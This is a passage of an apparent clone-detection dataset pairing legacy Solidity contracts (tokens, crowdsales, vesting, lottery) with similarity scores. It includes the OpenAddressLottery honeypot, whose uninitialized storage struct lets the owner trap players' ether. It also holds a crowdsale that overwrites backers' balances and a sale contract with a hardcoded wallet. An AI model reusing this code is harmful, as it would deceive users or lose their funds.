                        totalSupply -= _value;                      
                        Burn(msg.sender, _value);
                        return true;
                    }

                    
                    function burnFrom(address _from, uint256 _value) public returns (bool success) {
                        require(balanceOf[_from] >= _value);                
                        require(_value <= allowance[_from][msg.sender]);    
                        balanceOf[_from] -= _value;                         
                        allowance[_from][msg.sender] -= _value;             
                        totalSupply -= _value;                              
                        Burn(_from, _value);
                        return true;
                    }
                }",0.989887528,"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract MyToken is EIP20Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 

    function Constructor (
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol
    ) public {
        balances[msg.sender] = _initialAmount;               
        totalSupply = _initialAmount;                        
        name = _tokenName;                                   
        decimals = _decimalUnits;                            
        symbol = _tokenSymbol;                               
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] = SafeMath.sub(balances[msg.sender], _value);
        balances[_to] = SafeMath.add(balances[_to], _value);
        emit Transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] = SafeMath.add(balances[_to], _value);
        balances[_from] = SafeMath.sub(balances[_from], _value);
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);
        }
        emit Transfer(_from, _to, _value); 
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}",0.928519041,"contract AETN is EIP20Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 

    function AETN(
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol,
        address _address1,
        address _address2,
        address _address3
    ) public {
        balances[_address1] = _initialAmount/10*5;               
        balances[_address2] = _initialAmount/10*3;               
        balances[_address3] = _initialAmount/10*2;               
        totalSupply = _initialAmount;                        
        name = _tokenName;                                   
        decimals = _decimalUnits;                            
        symbol = _tokenSymbol;                               
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value); 
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}",1,,,,,
"contract Own {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}",0.96376633,"contract Ownable {

  address public owner;



  constructor() public {

    owner = msg.sender;

  }



  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

}",1,,,,,
"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal; uint public amountRaised; uint public deadline; uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    event GoalReached(address beneficiary, uint amountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);
    bool crowdsaleClosed = false;

    

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        token addressOfTokenUsedAsReward
    ) {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable {
        if (crowdsaleClosed) revert();
        uint amount = msg.value;
        balanceOf[msg.sender] = amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    function safeWithdrawal() afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",0.984213997,"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",1,,,,,
"contract SampleToken is PausableToken {
    string public constant name = ""Sample Token""; 
    string public constant symbol = ""STT"";
    uint256 public constant decimals = 18;

    mapping (address => uint256) freezes;

    
    event Burn(address indexed from, uint256 value);

    
    event Freeze(address indexed from, uint256 value);

    
    event Unfreeze(address indexed from, uint256 value);

    constructor() public {
        totalSupply_ = 500000000 * (10 ** uint256(decimals));
        balances[msg.sender] = totalSupply_;
        
    }

    function freezeOf(address _owner) public view returns (uint256) {
        return freezes[_owner];
    }

    function burn(uint256 _value) whenNotPaused public returns (bool) {
        require(_value <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_value);
        totalSupply_ = totalSupply_.sub(_value);
        emit Burn(msg.sender, _value);
        return true;
    }

    function freeze(uint256 _value) whenNotPaused public returns (bool) {
        require(_value <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_value);
        freezes[msg.sender] = freezes[msg.sender].add(_value);
        emit Freeze(msg.sender, _value);
        return true;
    }

    function unfreeze(uint256 _value) whenNotPaused public returns (bool) {
        require(_value <= freezes[msg.sender]);

        freezes[msg.sender] = freezes[msg.sender].sub(_value);
        balances[msg.sender] = balances[msg.sender].add(_value);
        emit Unfreeze(msg.sender, _value);
        return true;
    }

    
    function transferOwnership(address newOwner) onlyOwner whenNotPaused public {
        super.transferOwnership(newOwner);
    }

    
    function() payable external {
        revert();
    }
}",0.984837564,"contract FFToken is PausableToken {

    string public constant name = ""Fifty Five Token""; 

    string public constant symbol = ""FF"";

    uint256 public constant decimals = 18;



    mapping (address => uint256) freezes;



    

    event Burn(address indexed from, uint256 value);

	

	

    event Freeze(address indexed from, uint256 value);

	

	

    event Unfreeze(address indexed from, uint256 value);



    constructor() public {

        totalSupply_ = 10000000000 * (10 ** uint256(decimals));

        balances[msg.sender] = totalSupply_;

    }

    

    function freezeOf(address _owner) public view returns (uint256) {

        return freezes[_owner];

    }



    function burn(uint256 _value) whenNotPaused public returns (bool) {

        require(_value <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_value);

        totalSupply_ = totalSupply_.sub(_value);

        emit Burn(msg.sender, _value);

        return true;

    }

	

	function freeze(uint256 _value) whenNotPaused public returns (bool) {

        require(_value <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_value);

        freezes[msg.sender] = freezes[msg.sender].add(_value);

        emit Freeze(msg.sender, _value);

        return true;

    }

	

	function unfreeze(uint256 _value) whenNotPaused public returns (bool) {

        require(_value <= freezes[msg.sender]);

        

        freezes[msg.sender] = freezes[msg.sender].sub(_value);

		balances[msg.sender] = balances[msg.sender].add(_value);

        emit Unfreeze(msg.sender, _value);

        return true;

    }

    

    

    function transferOwnership(address newOwner) onlyOwner whenNotPaused public {

        super.transferOwnership(newOwner);

    }



    

    function() payable external {

        revert();

    }

}",1,,,,,
"contract ERC20 {
    function totalSupply() public view returns (uint supply);
    function balanceOf(address _owner) public view returns (uint balance);
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
    function approve(address _spender, uint _value) public returns (bool success);
    function allowance(address _owner, address _spender) public view returns (uint remaining);
    function decimals() public view returns(uint digits);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}",0.902081497,"contract ERC20 {
    function totalSupply() public view returns (uint supply);
    function balanceOf(address who) public view returns (uint value);
    function allowance(address owner, address spender) public view returns (uint remaining);

    function transfer(address to, uint value) public returns (bool ok);
    function transferFrom(address from, address to, uint value) public returns (bool ok);
    function approve(address spender, uint value) public returns (bool ok);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}",2,,,,,
"contract TokenVesting is Ownable {
  using SafeMath for uint256;
  using SafeERC20 for ERC20Basic;

  event Released(uint256 amount);
  event Revoked();

  
  address public beneficiary;

  uint256 public cliff;
  uint256 public start;
  uint256 public duration;

  bool public revocable;

  mapping (address => uint256) public released;
  mapping (address => bool) public revoked;

  
  function TokenVesting(address _beneficiary, uint256 _start, uint256 _cliff, uint256 _duration, bool _revocable) {
    require(_beneficiary != address(0));
    require(_cliff <= _duration);

    beneficiary = _beneficiary;
    revocable = _revocable;
    duration = _duration;
    cliff = _start.add(_cliff);
    start = _start;
  }

  
  function release(ERC20Basic token) public {
    uint256 unreleased = releasableAmount(token);

    require(unreleased > 0);

    released[token] = released[token].add(unreleased);

    token.safeTransfer(beneficiary, unreleased);

    Released(unreleased);
  }

  
  function revoke(ERC20Basic token) public onlyOwner {
    require(revocable);
    require(!revoked[token]);

    uint256 balance = token.balanceOf(this);

    uint256 unreleased = releasableAmount(token);
    uint256 refund = balance.sub(unreleased);

    revoked[token] = true;

    token.safeTransfer(owner, refund);

    Revoked();
  }

  
  function releasableAmount(ERC20Basic token) public constant returns (uint256) {
    return vestedAmount(token).sub(released[token]);
  }

  
  function vestedAmount(ERC20Basic token) public constant returns (uint256) {
    uint256 currentBalance = token.balanceOf(this);
    uint256 totalBalance = currentBalance.add(released[token]);

    if (now < cliff) {
      return 0;
    } else if (now >= start.add(duration) || revoked[token]) {
      return totalBalance;
    } else {
      return totalBalance.mul(now.sub(start)).div(duration);
    }
  }
}",0.988815488,"contract TokenVesting is Ownable {

  using SafeMath for uint256;

  using SafeERC20 for ERC20Basic;



  event Released(uint256 amount);

  event Revoked();



  

  address public beneficiary;



  uint256 public cliff;

  uint256 public start;

  uint256 public duration;



  bool public revocable;



  mapping (address => uint256) public released;

  mapping (address => bool) public revoked;



  

  function TokenVesting(address _beneficiary, uint256 _start, uint256 _cliff, uint256 _duration, bool _revocable) public {

    require(_beneficiary != address(0));

    require(_cliff <= _duration);



    beneficiary = _beneficiary;

    revocable = _revocable;

    duration = _duration;

    cliff = _start.add(_cliff);

    start = _start;

  }



  

  function release(ERC20Basic token) public {

    uint256 unreleased = releasableAmount(token);



    require(unreleased > 0);



    released[token] = released[token].add(unreleased);



    token.safeTransfer(beneficiary, unreleased);



    Released(unreleased);

  }



  

  function revoke(ERC20Basic token) public onlyOwner {

    require(revocable);

    require(!revoked[token]);



    uint256 balance = token.balanceOf(this);



    uint256 unreleased = releasableAmount(token);

    uint256 refund = balance.sub(unreleased);



    revoked[token] = true;



    token.safeTransfer(owner, refund);



    Revoked();

  }



  

  function releasableAmount(ERC20Basic token) public view returns (uint256) {

    return vestedAmount(token).sub(released[token]);

  }



  

  function vestedAmount(ERC20Basic token) public view returns (uint256) {

    uint256 currentBalance = token.balanceOf(this);

    uint256 totalBalance = currentBalance.add(released[token]);



    if (now < cliff) {

      return 0;

    } else if (now >= start.add(duration) || revoked[token]) {

      return totalBalance;

    } else {

      return totalBalance.mul(now.sub(start)).div(duration);

    }

  }

}",1,,,,,
"contract zeppelinSales {
  using SafeMath for uint256;
  using SafeERC20 for ERC20;

  
  ERC20 public token;

  
  address public wallet;

  
  
  
  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(
    address indexed purchaser,
        address indexed beneficiary,
    uint256 value,
    uint256 amount
  );

  
  constructor(uint256 _rate, address _wallet, ERC20 _token) public {
    require(_rate > 0);
    require(_wallet != address(0));
    require(_token != address(0));

    rate = 8 * (10**8);
    wallet = 0xF76075Cf3B674fB9656E393e9e17091B01243666;
    token = token = ERC20(0x0f26c1c05f1bbBC7Eff0488F1a98619e8a9758cf);
  }

  
  
  

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address _beneficiary) public payable {

    uint256 weiAmount = msg.value;
    _preValidatePurchase(_beneficiary, weiAmount);

    
    uint256 tokens = _getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    _processPurchase(_beneficiary, tokens);
    emit TokenPurchase(
      msg.sender,
      _beneficiary,
      weiAmount,
      tokens
    );

    _updatePurchasingState(_beneficiary, weiAmount);

    _forwardFunds();
    _postValidatePurchase(_beneficiary, weiAmount);
  }

  
  
  

  
  function _preValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    require(_beneficiary != address(0));
    require(_weiAmount != 0);
  }

  
  function _postValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _deliverTokens(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    token.safeTransfer(_beneficiary, _tokenAmount);
  }

  
  function _processPurchase(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    _deliverTokens(_beneficiary, _tokenAmount);
  }

  
  function _updatePurchasingState(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _getTokenAmount(uint256 _weiAmount)
    internal view returns (uint256)
  {
    return _weiAmount.mul(rate);
  }

  
  function _forwardFunds() internal {
    wallet.transfer(msg.value);
  }
}",0.946056921,"contract Crowdsale {
  using SafeMath for uint256;
  using SafeERC20 for ERC20;

  
  ERC20 public token;

  
  address public wallet;

  
  
  
  
  uint256 public rate;
  uint256 public divisor;

  
  uint256 public weiRaised;

  
  event TokenPurchase(
    address indexed purchaser,
    address indexed beneficiary,
    uint256 value,
    uint256 amount
  );

  
  constructor(uint256 _rate, uint256 _divisor, address _wallet, ERC20 _token) public {
    require(_rate > 0);
    require(_divisor > 0);
    require(_wallet != address(0));
    require(_token != address(0));

    rate = _rate;
    divisor = _divisor;
    wallet = _wallet;
    token = _token;
  }

  
  
  

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address _beneficiary) public payable {

    uint256 weiAmount = msg.value;
    _preValidatePurchase(_beneficiary, weiAmount);

    
    uint256 tokens = _getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    _processPurchase(_beneficiary, tokens);
    emit TokenPurchase(
      msg.sender,
      _beneficiary,
      weiAmount,
      tokens
    );

    _updatePurchasingState(_beneficiary, weiAmount);

    _forwardFunds();
    _postValidatePurchase(_beneficiary, weiAmount);
  }

  
  
  

  
  function _preValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    require(_beneficiary != address(0));
    require(_weiAmount != 0);
  }

  
  function _postValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _deliverTokens(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    token.safeTransfer(_beneficiary, _tokenAmount);
  }

  
  function _processPurchase(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    _deliverTokens(_beneficiary, _tokenAmount);
  }

  
  function _updatePurchasingState(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _getTokenAmount(uint256 _weiAmount)
    internal view returns (uint256)
  {
    return _weiAmount.mul(rate);
  }

  
  function _forwardFunds() internal {
    wallet.transfer(msg.value);
  }
}",1,,,,,
"contract Crowdsale is ReentrancyGuard {
  using SafeMath for uint256;
  using SafeERC20 for IERC20;

  
  IERC20 private _token;

  
  address private _wallet;

  
  
  
  
  uint256 private _rate;

  
  uint256 private _weiRaised;

  
  event TokensPurchased(
    address indexed purchaser,
    address indexed beneficiary,
    uint256 value,
    uint256 amount
  );

  
  constructor(uint256 rate, address wallet, IERC20 token) internal {
    require(rate > 0);
    require(wallet != address(0));
    
    require(address(token) != address(0));

    _rate = rate;
    _wallet = wallet;
    _token = token;
  }



  
  
  

  
  function () external payable {
    buyTokens(msg.sender);
  }


  
  function token() public view returns(IERC20) {
    return _token;
  }


  
  function wallet() public view returns(address) {
    return _wallet;
  }


  
  function rate() public view returns(uint256) {
    return _rate;
  }


  
  function weiRaised() public view returns (uint256) {
    return _weiRaised;
  }


  
  function buyTokens(address beneficiary) public nonReentrant payable {
    uint256 weiAmount = msg.value;
    _preValidatePurchase(beneficiary, weiAmount);

    
    uint256 tokens = _getTokenAmount(weiAmount);

    
    _weiRaised = _weiRaised.add(weiAmount);

    _processPurchase(beneficiary, tokens);

    emit TokensPurchased(msg.sender, beneficiary, weiAmount, tokens);

    _updatePurchasingState(beneficiary, weiAmount);

    _forwardFunds();
    _postValidatePurchase(beneficiary, weiAmount);
  }


  
  
  

  
   
   
  function _preValidatePurchase(address beneficiary, uint256 weiAmount) internal view {
    require(beneficiary != address(0));
    require(weiAmount != 0);
  }


  
  function _postValidatePurchase(address beneficiary, uint256 weiAmount) internal view {
    
  }


  
  function _deliverTokens(address beneficiary, uint256 tokenAmount ) internal {
    _token.safeTransfer(beneficiary, tokenAmount);
  }



  
  function _processPurchase(address beneficiary, uint256 tokenAmount) internal {
    _deliverTokens(beneficiary, tokenAmount);
  }


  
  function _updatePurchasingState(address beneficiary, uint256 weiAmount) internal {
    
  }


  
  function _getTokenAmount(uint256 weiAmount) internal view returns (uint256) {
    return weiAmount.mul(_rate);
  }


  
  function _forwardFunds() internal {
    _wallet.transfer(msg.value);
  }


}",0.990808915,"contract Crowdsale is ReentrancyGuard {

    using SafeMath for uint256;

    using SafeERC20 for IERC20;



    

    IERC20 private _token;



    

    address private _wallet;



    

    

    

    

    uint256 private _rate;



    

    uint256 private _weiRaised;



    

    event TokensPurchased(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);



    

    constructor (uint256 rate, address wallet, IERC20 token) internal {

        require(rate > 0);

        require(wallet != address(0));

        require(token != address(0));



        _rate = rate;

        _wallet = wallet;

        _token = token;

    }



    

    

    



    

    function () external payable {

        buyTokens(msg.sender);

    }



    

    function token() public view returns (IERC20) {

        return _token;

    }



    

    function wallet() public view returns (address) {

        return _wallet;

    }



    

    function rate() public view returns (uint256) {

        return _rate;

    }



    

    function weiRaised() public view returns (uint256) {

        return _weiRaised;

    }



    

    function buyTokens(address beneficiary) public nonReentrant payable {

        uint256 weiAmount = msg.value;

        _preValidatePurchase(beneficiary, weiAmount);



        

        uint256 tokens = _getTokenAmount(weiAmount);



        

        _weiRaised = _weiRaised.add(weiAmount);



        _processPurchase(beneficiary, tokens);

        emit TokensPurchased(msg.sender, beneficiary, weiAmount, tokens);



        _updatePurchasingState(beneficiary, weiAmount);



        _forwardFunds();

        _postValidatePurchase(beneficiary, weiAmount);

    }



    

    

    



    

    function _preValidatePurchase(address beneficiary, uint256 weiAmount) internal view {

        require(beneficiary != address(0));

        require(weiAmount != 0);

    }



    

    function _postValidatePurchase(address beneficiary, uint256 weiAmount) internal view {

        

    }



    

    function _deliverTokens(address beneficiary, uint256 tokenAmount) internal {

        _token.safeTransfer(beneficiary, tokenAmount);

    }



    

    function _processPurchase(address beneficiary, uint256 tokenAmount) internal {

        _deliverTokens(beneficiary, tokenAmount);

    }



    

    function _updatePurchasingState(address beneficiary, uint256 weiAmount) internal {

        

    }



    

    function _getTokenAmount(uint256 weiAmount) internal view returns (uint256) {

        return weiAmount.mul(_rate);

    }



    

    function _forwardFunds() internal {

        _wallet.transfer(msg.value);

    }

}",4,*,,,,
"contract Recoverable is Ownable {

  
  function Recoverable() public {
  }

  
  
  function recoverTokens(ERC20Basic token) onlyOwner public {
    token.transfer(owner, tokensToBeReturned(token));
  }

  
  
  
  function tokensToBeReturned(ERC20Basic token) public returns (uint) {
    return token.balanceOf(this);
  }
}",0.940681736,"contract Recoverable is Ownable {



  

  constructor() public {

  }



  

  

  function recoverTokens(ERC20Basic token) onlyOwner public {

    token.transfer(owner, tokensToBeReturned(token));

  }



  

  

  

  function tokensToBeReturned(ERC20Basic token) public view returns (uint) {

    return token.balanceOf(this);

  }

}",1,,,,,
"contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;


  
  modifier whenNotPaused() {
    if (paused) throw;
    _;
  }

  
  modifier whenPaused {
    if (!paused) throw;
    _;
  }

  
  function pause() onlyOwner whenNotPaused returns (bool) {
    paused = true;
    Pause();
    return true;
  }

  
  function unpause() onlyOwner whenPaused returns (bool) {
    paused = false;
    Unpause();
    return true;
  }
}",0.935128226,"contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;

  
  modifier whenNotPaused() {
    require(!paused);
    _;
  }

  
  modifier whenPaused {
    require(paused);
    _;
  }

  
  function pause() onlyOwner whenNotPaused public returns (bool) {
    paused = true;
    Pause();
    return true;
  }

  
  function unpause() onlyOwner whenPaused public returns (bool) {
    paused = false;
    Unpause();
    return true;
  }
}",1,,,,,
"contract OpenAddressLottery{
    struct SeedComponents{
        uint component1;
        uint component2;
        uint component3;
        uint component4;
    }
    
    address owner; 
    uint private secretSeed; 
    uint private lastReseed; 
    uint LuckyNumber = 7; 
        
    mapping (address => bool) winner; 
    
    function OpenAddressLottery() {
        owner = msg.sender;
        reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); 
    }
    
    function participate() payable {
        if(msg.value<0.1 ether)
            return; 
        
        
        require(winner[msg.sender] == false);
        
        if(luckyNumberOfAddress(msg.sender) == LuckyNumber){ 
            winner[msg.sender] = true; 
            
            uint win=msg.value*7; 
            
            if(win>this.balance) 
                win=this.balance; 
            msg.sender.transfer(win);
        }
        
        if(block.number-lastReseed>1000) 
            reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); 
    }
    
    function luckyNumberOfAddress(address addr) constant returns(uint n){
        
        n = uint(keccak256(uint(addr), secretSeed)[0]) % 8;
    }
    
    function reseed(SeedComponents components) internal {
        secretSeed = uint256(keccak256(
            components.component1,
            components.component2,
            components.component3,
            components.component4
        )); 
        lastReseed = block.number;
    }
    
    function kill() {
        require(msg.sender==owner);
        
        selfdestruct(msg.sender);
    }
    
    function forceReseed() { 
        require(msg.sender==owner);
        
        SeedComponents s;
        s.component1 = uint(msg.sender);
        s.component2 = uint256(block.blockhash(block.number - 1));
        s.component3 = block.difficulty*(uint)(block.coinbase);
        s.component4 = tx.gasprice * 7;
        
        reseed(s); 
    }
    
    function () payable { 
        if(msg.value>=0.1 ether && msg.sender!=owner) 
            participate();
    }

}",0.993504892,"contract OpenAddressLottery{
    struct SeedComponents{
        uint component1;
        uint component2;
        uint component3;
        uint component4;
    }
    
    address owner; 
    uint private secretSeed; 
    uint private lastReseed; 
    uint LuckyNumber = 1; 
        
    mapping (address => bool) winner; 
    
    function OpenAddressLottery() {
        owner = msg.sender;
        reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); 
    }
    
    function participate() payable {
        if(msg.value<0.1 ether)
            return; 
        
        
        require(winner[msg.sender] == false);
        
        if(luckyNumberOfAddress(msg.sender) == LuckyNumber){ 
            winner[msg.sender] = true; 
            
            uint win=(msg.value/10)*19; 
            
            if(win>this.balance) 
                win=this.balance; 
            msg.sender.transfer(win);
        }
        
        if(block.number-lastReseed>1000) 
            reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); 
    }
    
    function luckyNumberOfAddress(address addr) constant returns(uint n){
        
        n = uint(keccak256(uint(addr), secretSeed)[0]) % 2; 
    }
    
    function reseed(SeedComponents components) internal {
        secretSeed = uint256(keccak256(
            components.component1,
            components.component2,
            components.component3,
            components.component4
        )); 
        lastReseed = block.number;
    }
    
    function kill() {
        require(msg.sender==owner);
        
        selfdestruct(msg.sender);
    }
    
    function forceReseed() { 
        require(msg.sender==owner);
        
        SeedComponents s;
        s.component1 = uint(msg.sender);
        s.component2 = uint256(block.blockhash(block.number - 1));
        s.component3 = block.difficulty*(uint)(block.coinbase);
        s.component4 = tx.gasprice * 7;
        
        reseed(s); 
    }
    
    function () payable { 
        if(msg.value>=0.1 ether && msg.sender!=owner) 
            participate();
    }

}",1,,,,,
"contract SafeMath{
  function safeMul(uint a, uint b) internal pure returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function safeDiv(uint a, uint b) internal pure returns (uint) {
    assert(b > 0);
    uint c = a / b;
    assert(a == b * c + a % b);
    return c;
  }

    function safeSub(uint a, uint b) internal pure returns (uint) {
        assert(b <= a);
        return a - b;
  }

    function safeAdd(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
  }

}",0.980851359,"contract SafeMath {
    function safeMul(uint a, uint b) pure internal returns(uint) {
        uint c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function safeSub(uint a, uint b) pure  internal returns(uint) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint a, uint b) pure internal returns(uint) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
    
